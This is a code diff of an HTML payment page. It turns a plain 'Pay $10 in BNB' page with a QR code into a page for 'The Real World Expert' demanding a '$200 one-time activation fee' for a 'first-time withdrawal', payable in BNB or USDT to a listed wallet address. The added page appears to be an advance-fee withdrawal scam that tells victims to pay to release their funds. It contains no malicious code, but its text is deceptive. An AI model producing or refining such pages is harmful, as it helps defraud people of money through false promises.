@@ -3,59 +3,57 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pay $10 in BNB</title>
+  <title>Activation Fee – The Real World Expert</title>
+  <link rel="stylesheet" href="assets/style.css">
   <style>
-    body { font-family: Arial, sans-serif; background: #f5f5f5; text-align: center; padding: 50px; }
-    .container { background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); display: inline-block; }
-    h1 { color: #f3ba2f; }
-    p { font-size: 18px; margin: 15px 0; }
-    .wallet { font-weight: bold; font-size: 20px; color: #333; word-break: break-all; }
-    .amount { font-size: 24px; font-weight: bold; color: #333; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; cursor: pointer; background: #f3ba2f; border: none; border-radius: 5px; color: #fff; }
-    canvas { margin-top: 20px; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+      color: #111;
+      text-align: center;
+      padding: 40px;
+    }
+    img {
+      width: 140px;
+      margin-bottom: 20px;
+    }
+    .card {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    .highlight {
+      color: #007bff;
+      font-weight: 600;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #777;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Pay $10 in BNB</h1>
-    <p>Send exactly $10 worth of BNB to this wallet:</p>
-    <p class="wallet">0x18cc9a408760fc1d50a3ff9c94f14619fcdf5e0b</p>
-    <button onclick="copyWallet()">Copy Wallet Address</button>
-    <p>Scan QR code to pay:</p>
-    <div id="qrcode"></div>
-    <p>Amount: <span class="amount" id="amount">Loading...</span></p>
-    <p><small>Check current BNB price to send the correct amount.</small></p>
+  <img src="assets/logo.webp" alt="The Real World Expert Logo">
+  <div class="card">
+    <h2>Account Activation Fee</h2>
+    <p>As a <strong>first-time withdrawal</strong>, a <span class="highlight">$200 one-time activation fee</span> is required to complete your withdrawal. This fee covers <strong>all future withdrawals</strong> — no further charges will apply.</p>
+
+    <p>Please ensure you use your registered wallet address for payment to avoid delays.</p>
+
+    <h3>Total: <span class="highlight">$200</span></h3>
+
+    <p>Accepted Networks: <strong>BNB (BEP20)</strong> / <strong>USDT (BEP20)</strong></p>
+
+    <p>Wallet Address: <br><code>0x18cc9a408760fc1d50a3ff9c94f14619fcdf5e0b</code></p>
+
+    <p><em>Once payment is confirmed, your withdrawal will be processed immediately.</em></p>
   </div>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <script>
-    // Generate QR code
-    new QRCode(document.getElementById("qrcode"), {
-      text: "0x18cc9a408760fc1d50a3ff9c94f14619fcdf5e0b",
-      width: 200,
-      height: 200
-    });
-
-    // Function to copy wallet address
-    function copyWallet() {
-      const wallet = document.querySelector(".wallet").innerText;
-      navigator.clipboard.writeText(wallet).then(() => {
-        alert("Wallet address copied!");
-      });
-    }
-
-    // Fetch current BNB price and calculate amount
-    fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd')
-      .then(response => response.json())
-      .then(data => {
-        const bnbPrice = data.binancecoin.usd;
-        const amount = (10 / bnbPrice).toFixed(6); // Calculate amount for $10
-        document.getElementById("amount").innerText = `${amount} BNB`;
-      })
-      .catch(error => {
-        console.error('Error fetching BNB price:', error);
-        document.getElementById("amount").innerText = 'Error fetching price';
-      });
-  </script>
+  <footer>
+    &copy; 2025 The Real World Expert. All rights reserved.
+  </footer>
 </body>
 </html>
